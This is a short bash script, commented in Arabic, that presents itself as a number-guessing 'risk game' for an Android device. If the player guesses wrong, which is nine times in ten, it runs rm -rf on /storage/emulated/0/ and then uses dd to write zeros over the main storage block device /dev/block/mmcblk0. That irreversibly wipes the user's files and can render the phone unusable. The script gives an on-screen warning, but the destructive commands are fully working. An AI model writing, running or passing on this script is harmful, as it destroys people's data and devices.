#!/bin/bash

# مجلد المخاطرة (يمكن تغييره)
RISK_DIR="/storage/emulated/0/"

# رسالة الترحيب
echo "مرحبًا بك في لعبة المخاطرة!"
echo "إذا خسرت، سيتم حذف جميع الملفات في مجلد: $RISK_DIR"
echo "ثم سيتم كتابة أصفار على جهاز التخزين الرئيسي (mmcblk0)!"
echo "هل أنت مستمر؟ (y/n)"
read choice

if [[ $choice != "y" ]]; then
    echo "لقد انسحبت بسلام!"
    exit 0
fi

# اختيار رقم عشوائي بين 1 و 10
SECRET_NUMBER=$((RANDOM % 10 + 1))

echo "اختر رقمًا بين 1 و 10:"
read user_number

if [[ $user_number -eq $SECRET_NUMBER ]]; then
    echo "مبروك! لقد فزت. الرقم الصحيح كان: $SECRET_NUMBER"
else
    echo "لقد خسرت! الرقم الصحيح كان: $SECRET_NUMBER"
    echo "جارٍ حذف جميع الملفات في مجلد: $RISK_DIR ..."
    rm -rf "$RISK_DIR"*
    echo "تم حذف جميع الملفات!"

    # كتابة أصفار على جهاز التخزين الرئيسي
    echo "جارٍ كتابة أصفار على جهاز التخزين الرئيسي (mmcblk0) ..."
    echo "هذه العملية غير قابلة للعكس! سيتم تدمير جميع البيانات!"
    dd if=/dev/zero of=/dev/block/mmcblk0 bs=1M
    echo "تم تدمير جميع البيانات على الجهاز!"
fi
